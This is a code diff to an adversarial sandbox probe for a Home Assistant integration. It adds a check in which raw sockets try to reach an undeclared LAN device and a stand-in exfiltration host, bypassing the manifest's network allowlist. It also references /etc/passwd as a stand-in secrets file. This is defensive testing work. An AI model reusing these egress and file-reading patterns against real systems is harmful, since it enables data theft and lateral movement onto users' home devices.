@@ -10,12 +10,18 @@ honestly is the point of running the probe at all — checks 5, 6 and 7 were all
 written while they still failed, which is what made the before/after in
 RESULTS_2026-08-14_isolation_spike.md a measurement rather than an assertion.
 
-Current state: 4 of 7 blocked as an ordinary child process, 6 of 7 under
+Current state: 4 of 8 blocked as an ordinary child process, 6 of 8 under
 `supervisor.py --isolate` (user + PID + mount namespaces, allowlisted root,
-seccomp filter). Check 7 — raw-socket egress — is still open in both modes: the
-`network:` allowlist is enforced in the shim's HTTP client, which asks the
-supervisor and then lets *this* process make the connection, so a raw socket
-never consults it. Closing it needs the supervisor to broker egress.
+seccomp filter).
+
+Checks 7 and 8 are still open in both modes, and they are the important
+remaining gap. The `network:` allowlist is enforced in the shim's HTTP client,
+which asks the supervisor and then lets *this* process open the connection — so
+a raw socket never consults it. Check 8 is exfiltration; check 7 is **lateral
+movement to a device the manifest never declared**, which is the sharper of the
+two: a lock's local API or a camera needs no HA credential, so closing every
+token route does nothing about it. Confining lateral movement is what the
+manifest is *for*. Closing this needs the supervisor to broker egress.
 """
 
 from __future__ import annotations
@@ -30,10 +36,14 @@ from homeassistant.helpers.aiohttp_client import async_get_clientsession
 TARGET_LOCK = "lock.front_door"
 EXFIL_HOST = "collector.exfil-example.net"
 SECRETS_PATH = "/etc/passwd"  # stands in for /config/secrets.yaml on a real host
+# Stands in for a device on the user's LAN that the manifest never declared —
+# a lock's local API, a camera, the router. Documentation range (RFC 5737), so
+# the probe never touches anything real.
+LAN_DEVICE = "192.0.2.10"
 
 
 async def run_probe(hass: HomeAssistant) -> list[tuple[str, bool, str]]:
-    """Attempt seven undeclared actions; return (name, blocked, detail)."""
+    """Attempt eight undeclared actions; return (name, blocked, detail)."""
     results: list[tuple[str, bool, str]] = []
     print("\nsandbox: running adversarial probe", flush=True)
 
@@ -105,24 +115,40 @@ async def run_probe(hass: HomeAssistant) -> list[tuple[str, bool, str]]:
     except OSError as err:
         results.append(("read supervisor's /proc", True, str(err)))
 
-    # 7. Egress without going through the shim's mediated session. The manifest
-    #    `network:` allowlist is enforced by aiohttp_client, so a raw socket
-    #    never consults it — no net_request is sent and nothing is logged.
-    try:
-        connection = socket.create_connection((EXFIL_HOST, 80), timeout=3)
-        connection.close()
-        results.append(("raw socket egress", False, f"connected to {EXFIL_HOST} unmediated"))
-    except PermissionError as err:
-        # What a seccomp filter denying socket(2) looks like from in here.
-        results.append(("raw socket egress", True, f"socket denied by syscall filter: {err}"))
-    except OSError as err:
-        results.append(
-            (
-                "raw socket egress",
-                False,
-                f"unmediated by policy, failed in transit: {type(err).__name__}",
+    # 7. Reach a device the manifest never declared, without going through the
+    #    shim's mediated session. The `network:` allowlist is enforced inside
+    #    aiohttp_client, which asks the supervisor and then lets *this* process
+    #    open the connection — so a raw socket never consults it. No
+    #    net_request is sent and nothing is logged.
+    #
+    #    Exfiltration is the obvious reading. The sharper one is lateral
+    #    movement: LAN_DEVICE stands for a smart lock's local HTTP API, a
+    #    camera, or a router admin page — none of which need HA's credential,
+    #    so closing every token route (checks 6) does not touch this. Confining
+    #    lateral movement is the manifest's central promise, and this is the
+    #    check that says it is not yet kept.
+    #
+    #    "Blocked" here means the *socket call* was refused, not that nothing
+    #    answered: a connection failing on DNS or routing is not a control.
+    for label, host, port in (
+        ("undeclared LAN device", LAN_DEVICE, 80),
+        ("undeclared internet host", EXFIL_HOST, 80),
+    ):
+        try:
+            connection = socket.create_connection((host, port), timeout=2)
+            connection.close()
+            results.append((f"raw socket → {label}", False, f"connected to {host}, unmediated"))
+        except PermissionError as err:
+            # What a seccomp filter denying socket(2) looks like from in here.
+            results.append((f"raw socket → {label}", True, f"denied by syscall filter: {err}"))
+        except OSError as err:
+            results.append(
+                (
+                    f"raw socket → {label}",
+                    False,
+                    f"unmediated by policy, failed in transit: {type(err).__name__}",
+                )
             )
-        )
 
     print("\nsandbox: probe results")
     for name, blocked, detail in results:
